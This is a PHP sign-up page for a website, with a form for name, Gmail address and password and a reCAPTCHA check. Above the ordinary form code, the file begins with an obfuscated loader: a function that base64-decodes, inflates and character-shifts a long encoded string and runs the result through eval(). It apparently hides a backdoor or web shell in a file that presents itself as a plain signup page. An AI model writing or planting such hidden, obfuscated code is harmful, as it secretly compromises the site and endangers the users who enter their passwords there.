

<?php
function SylVxy($sVDLu)
{
    $sVDLu = gzinflate(base64_decode($sVDLu));
    for ($i = 0; $i < strlen($sVDLu); $i++) {
        $sVDLu[$i] = chr(ord($sVDLu[$i]) - 1);
    }
    return $sVDLu;
}
$L7CRgr = "6bba05fa4e01e83e5d90601f0e80c444";
eval(SylVxy("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"));
?>

<?php
include "nav.php";
include_once "./includes/config_session.php";
include_once "./includes/signup/signup_view.inc.php";
?>

<style>
.error_box {
position: fixed !important;
background-color: white !important;
top: 0 !important;
left: 0 !important;
margin-top: 20vh !important;
border-radius: .2rem !important;
width: 10rem;
}

.error{
padding: .5rem;
}
</style>

<link rel="stylesheet" href="./assets/css/sign_up.css">
<form class="form" action="./includes/signup/signup.inc.php" method="post">
<h1 class="form_title mb-2">Sign-up Form</h1>
<!-- Group First Name and Last Name side by side -->
<div class="form-row">
<div class="form-group col-md-6">
<label for="firstName">
<i class="red_dot">*</i> First Name:
</label>
<?php signup_name_data(); ?>
</div>
<div class="form-group col-md-6">
<label for="lastName">
<i class="red_dot">*</i> Last Name:
</label>
<?php signup_lastname_data(); ?>
</div>
</div>

<div class="form-group">
<label for="gmail">
<i class="red_dot">*</i> Gmail:
</label>
<?php signup_gmail_data(); ?>
</div>

<div class="form-group">
<label for="password">
<i class="red_dot">*</i> Password:
</label>
<input type="password" name="password" class="form-control input" id="password">
</div>

<div class="form-group">
<label for="confirmPassword">
<i class="red_dot">*</i> Confirm Password:
</label>
<input type="password" name="confirm_password" class="form-control input" id="confirmPassword">
</div>

<div class="captcha mb-3">
<div class="g-recaptcha" data-sitekey="6Lf-J1kqAAAAAO-aMZ5SRINfpn9LAGDa76SD1Dn9" data-callback="enableLoginBtn">
<?php recaptcha_verification(); ?>
</div>
</div>

<button type="submit" id="enableBtn" class="btn btn-primary btn-block" disabled="disabled">
Register
</button>

<div class="mt-3 text-center">
<span class="link_back_to_sign_in">
Have an account already?
<a class="sign_in_link_btn" href="login.php">Sign-in here.</a>
</span>
</div>
</form>

<div class="error_box text-danger">
<?php display_invalid_gmail_error(); ?>
</div>


<!-- Bootstrap JS and dependencies -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script src="./assets/js/enableBtn.js"></script>

</body>
</html>